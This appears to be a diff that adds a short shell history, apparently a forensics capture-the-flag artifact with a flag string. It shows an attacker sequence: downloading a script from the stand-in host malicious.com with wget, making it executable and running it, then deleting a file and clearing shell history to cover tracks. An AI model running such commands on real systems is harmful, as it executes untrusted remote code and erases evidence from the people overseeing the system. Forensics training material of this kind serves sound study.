@@ -1,0 +1,8 @@
+ls -la
+cd /tmp
+wget http://malicious.com/payload.sh
+chmod +x payload.sh
+./payload.sh
+echo "CTF{forensics_3afzztr1wec9}" > /tmp/secret.txt
+rm /tmp/secret.txt
+history -c
